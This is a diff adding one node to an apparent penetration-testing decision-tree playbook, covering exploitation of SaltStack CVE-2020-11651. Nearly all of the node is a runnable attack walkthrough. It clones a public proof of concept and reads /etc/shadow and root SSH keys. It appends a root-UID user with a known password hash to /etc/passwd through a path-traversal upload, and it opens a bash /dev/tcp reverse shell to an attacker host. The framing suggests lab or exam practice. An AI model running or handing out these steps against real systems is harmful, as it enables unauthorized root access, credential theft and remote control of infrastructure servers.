@@ -1,0 +1,30 @@
+{
+  "id": "saltstack",
+  "phase": "EXPLOIT",
+  "title": "SaltStack — CVE-2020-11651 (Unauthenticated RCE / File Read / File Write)",
+  "body": "SaltStack is an infrastructure automation platform. Ports 4505 and 4506 running ZeroMQ ZMTP are the giveaway — 4505 is the publish bus, 4506 is the request/reply channel to the master. CVE-2020-11651 is an authentication bypass in the ClearFuncs class that lets an unauthenticated client obtain the root key and call master functions directly: arbitrary file read, arbitrary file write, and remote command execution. Affects SaltStack < 3000.2. Exploit is a Python script that requires the salt module — needs a venv since Kali blocks system pip.\n\nThe /etc/passwd write technique is the cleanest path to root SSH access: read the current passwd, append a new root-UID user with a known password hash, upload the modified file, SSH in. No reverse shell needed.",
+  "cmd": "# ══════════════════════════════════════════════════\n# IDENTIFY — nmap fingerprint\n# ══════════════════════════════════════════════════\n# 4505/tcp  open  zmtp  ZeroMQ ZMTP 2.0\n# 4506/tcp  open  zmtp  ZeroMQ ZMTP 2.0\n# Both open = SaltStack master. Check 8000 for Salt API (HTTP).\n# Version check:\ncurl -sk http://$ip:8000/  # Salt API may expose version in JSON\n\n# ══════════════════════════════════════════════════\n# SETUP — venv (salt module blocked by PEP 668)\n# ══════════════════════════════════════════════════\ngit clone https://github.com/jasperla/CVE-2020-11651-poc exploits/CVE-2020-11651-poc\ncd exploits/CVE-2020-11651-poc\npython3 -m venv venv\nsource venv/bin/activate\npip install salt\n# (salt package is ~15MB — takes a moment)\n# Prompt shows (venv) when active — pip installs go here, no PEP668 error\n# Re-activate next session: source venv/bin/activate\n\n# ══════════════════════════════════════════════════\n# CONFIRM VULNERABILITY\n# ══════════════════════════════════════════════════\npython3 exploit.py --master $ip\n# [+] Checking salt-master ($ip:4506) status... ONLINE\n# [+] Checking if vulnerable to CVE-2020-11651... YES\n# [*] root key obtained: <key>\n# If YES → proceed. If NO → version is patched.\n\n# ══════════════════════════════════════════════════\n# STEP 1 — ARBITRARY FILE READ\n# ══════════════════════════════════════════════════\npython3 exploit.py --master $ip -r /etc/passwd\npython3 exploit.py --master $ip -r /etc/shadow\npython3 exploit.py --master $ip -r /root/proof.txt\npython3 exploit.py --master $ip -r /root/.ssh/id_rsa\n# Useful reads: /etc/passwd (users), /etc/shadow (hashes), /root/proof.txt, SSH keys\n\n# ══════════════════════════════════════════════════\n# STEP 2 — /etc/passwd WRITE → ROOT SSH (cleanest path)\n# ══════════════════════════════════════════════════\n# Read current passwd first:\npython3 exploit.py --master $ip -r /etc/passwd > passwd\n# Strip the exploit banner lines (keep only passwd content):\ngrep -v '\\[' passwd | grep -v '^$' | grep ':' > passwd_clean && mv passwd_clean passwd\n\n# Generate hash for your password:\nopenssl passwd w00t     # → Fdzt.eqJQ4s0g (or use your own)\n\n# Append root-level user:\necho \"jimi421:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash\" >> passwd\n\n# Upload modified passwd back:\npython3 exploit.py --master $ip --upload-src passwd --upload-dest ../../../../../../etc/passwd\n# [+] Wrote data to file /srv/salt/../../../../../../etc/passwd\n\n# Verify it landed:\npython3 exploit.py --master $ip -r /etc/passwd | grep jimi421\n\n# SSH in as root:\nssh jimi421@$ip   # password: w00t\nid                # uid=0(root)\n\n# ══════════════════════════════════════════════════\n# ALTERNATIVE — DIRECT RCE via exec\n# ══════════════════════════════════════════════════\n# The exploit also supports --exec for command execution:\npython3 exploit.py --master $ip --exec 'id'\npython3 exploit.py --master $ip --exec 'cat /root/proof.txt'\n# Reverse shell via exec:\npython3 exploit.py --master $ip --exec 'bash -i >& /dev/tcp/<lhost>/<lport> 0>&1'\n# (set up nc -lvnp <lport> on Kali first)\n\n# ══════════════════════════════════════════════════\n# TROUBLESHOOTING\n# ══════════════════════════════════════════════════\n# 'ModuleNotFoundError: No module named salt' → venv not activated\n#   source venv/bin/activate  then retry\n\n# Upload path traversal: exploit writes to /srv/salt/../../etc/passwd\n#   Always use ../../../../../../etc/passwd (6 levels up from /srv/salt/)\n#   Verify with -r /etc/passwd after upload\n\n# DeprecationWarning about salt.transport.client → harmless, ignore it\n#   salt 3008.x deprecates old transport module — exploit still works\n\n# 'OFFLINE' on master check → wrong port or firewall\n#   Confirm 4506 is open: nmap -sT -Pn -p 4506 $ip",
+  "warn": "The exploit banner lines (lines starting with [) in the file read output must be stripped before using the output as a file — otherwise you corrupt /etc/passwd and may lock yourself out. Always verify the uploaded file with -r /etc/passwd before SSH. Keep a backup of the original passwd output in case recovery is needed.",
+  "choices": [
+    {
+      "label": "Got root via passwd write — grab proof",
+      "next": "got_root_linux"
+    },
+    {
+      "label": "Got shadow hashes via file read — crack them",
+      "next": "hashcrack"
+    },
+    {
+      "label": "Need venv setup detail",
+      "next": "python_venv_setup"
+    },
+    {
+      "label": "passwd/shadow abuse detail",
+      "next": "passwd_shadow"
+    },
+    {
+      "label": "Back to services",
+      "next": "other_services"
+    }
+  ]
+}
